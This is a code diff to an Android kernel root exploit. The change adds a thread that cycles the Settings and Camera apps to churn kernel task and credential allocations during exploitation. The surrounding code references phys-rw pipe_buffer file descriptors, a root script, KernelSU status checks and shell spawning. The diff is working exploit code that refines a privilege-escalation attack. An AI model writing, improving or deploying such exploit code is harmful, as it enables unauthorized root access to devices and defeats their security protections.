@@ -333,7 +333,72 @@ static void run_apd_services_stage(void) {
     pr_error("[!] apd services stage failed to spawn shell\n");
 }
 
+/* Background app-launcher churn. Runs as a separate thread in the parent
+ * (u:r:shell:s0) context while the kernel exploit executes. Each cycle
+ * launches an app, lets it run 3s, force-stops it, waits 1s; the rhythm is
+ * 5x Settings then 1x Camera, repeating — generating task_struct/cred
+ * allocation churn. Launcher children fork+exec with all non-std fds closed
+ * so they cannot inherit the exploit's phys-rw pipe_buffer fds. Stopped at
+ * the top of finish_exploit(). */
+static pthread_t churn_tid;
+static atomic_int churn_stop;
+static int churn_started = 0;
+
+static void churn_run(const char *cmd) {
+  pid_t pid = fork();
+  if (pid < 0) return;
+  if (pid == 0) {
+    struct rlimit rl;
+    if (getrlimit(RLIMIT_NOFILE, &rl) == 0)
+      for (rlim_t fd = 3; fd < rl.rlim_cur; fd++) close((int)fd);
+    execl("/system/bin/sh", "sh", "-c", cmd, (char *)NULL);
+    _exit(127);
+  }
+  int status;
+  while (waitpid(pid, &status, 0) < 0 && errno == EINTR) {}
+}
+
+static void *settings_churn_thread(void *arg) {
+  (void)arg;
+  pr_info("[*] app churn thread started\n");
+  int cycle = 0;
+  while (!atomic_load(&churn_stop)) {
+    const char *launch_cmd, *kill_cmd;
+    if (cycle % 6 == 5) {
+      launch_cmd = "am start -a android.media.action.STILL_IMAGE_CAMERA >/dev/null 2>&1";
+      kill_cmd = "am force-stop com.android.camera >/dev/null 2>&1";
+    } else {
+      launch_cmd = "am start -a android.settings.SETTINGS >/dev/null 2>&1";
+      kill_cmd = "am force-stop com.android.settings >/dev/null 2>&1";
+    }
+    churn_run(launch_cmd);
+    for (int i = 0; i < 30 && !atomic_load(&churn_stop); i++) usleep(100000);
+    if (atomic_load(&churn_stop)) break;
+    churn_run(kill_cmd);
+    for (int i = 0; i < 10 && !atomic_load(&churn_stop); i++) usleep(100000);
+    cycle++;
+  }
+  pr_info("[*] app churn thread stopped\n");
+  return NULL;
+}
+
+static void start_settings_churn(void) {
+  atomic_store(&churn_stop, 0);
+  if (pthread_create(&churn_tid, NULL, settings_churn_thread, NULL) == 0)
+    churn_started = 1;
+  else
+    pr_error("[!] settings churn thread failed to start\n");
+}
+
+static void stop_settings_churn(void) {
+  if (!churn_started) return;
+  atomic_store(&churn_stop, 1);
+  pthread_join(churn_tid, NULL);
+  churn_started = 0;
+}
+
 static int finish_exploit(void) {
+  stop_settings_churn();
   int rc = wait_for_ksu_status();
   if (rc == 0)
     run_apd_services_stage();
@@ -578,6 +643,8 @@ int run_exploit(int argc, char **argv) {
 
   timer_reset();
   TIMER("exploit start");
+
+  start_settings_churn();
 
   write_root_script();
 
